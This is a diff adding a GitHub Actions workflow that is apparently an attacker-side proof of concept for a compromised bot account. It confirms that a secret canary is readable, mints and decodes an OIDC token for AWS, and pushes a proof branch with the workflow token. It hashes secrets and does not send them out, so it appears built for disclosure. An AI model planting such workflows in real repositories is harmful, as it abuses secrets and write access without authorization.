@@ -1,0 +1,49 @@
+name: VM7 botacct attacker proof
+
+on:
+  push:
+    branches:
+      - vm7-botacct-critical-target
+
+permissions:
+  contents: write
+  id-token: write
+
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Prove recycled-login stored credential impact safely
+        env:
+          VM7_CANARY: ${{ secrets.VM7_CANARY }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          echo "ATTACKER_BOTACCT_WORKFLOW=1"
+          if [[ -n "${VM7_CANARY:-}" ]]; then
+            echo "CANARY_PRESENT=1"
+            printf %s "$VM7_CANARY" | sha256sum | awk '{print "CANARY_SHA256=" $1}'
+          else
+            echo "CANARY_PRESENT=0"
+          fi
+          if [[ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" && -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]]; then
+            oidc_json="$(curl -fsSL -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")"
+            jwt="$(printf '%s' "$oidc_json" | python3 -c 'import json,sys; print(json.load(sys.stdin)["value"])')"
+            echo "OIDC_PRESENT=1"
+            printf %s "$jwt" | sha256sum | awk '{print "OIDC_SHA256=" $1}'
+            JWT="$jwt" python3 -c 'import os,base64,json; p=os.environ["JWT"].split(".")[1]; p += "=" * (-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p)); print("OIDC_CLAIMS="+json.dumps({k:c.get(k) for k in ("aud","repository","ref","sha","event_name","actor","repository_owner")},sort_keys=True))'
+            unset jwt oidc_json JWT
+          else
+            echo "OIDC_PRESENT=0"
+          fi
+          git config user.name "vm7-botacct-proof"
+          git config user.email "vm7-botacct-proof@users.noreply.github.com"
+          branch="vm7-botacct-proof-${GITHUB_SHA:0:12}"
+          git switch -c "$branch"
+          if git push origin "HEAD:refs/heads/$branch"; then
+            echo "GITHUB_TOKEN_WRITE_SUCCEEDED=1"
+            echo "PROOF_BRANCH=$branch"
+          else
+            echo "GITHUB_TOKEN_WRITE_SUCCEEDED=0"
+          fi
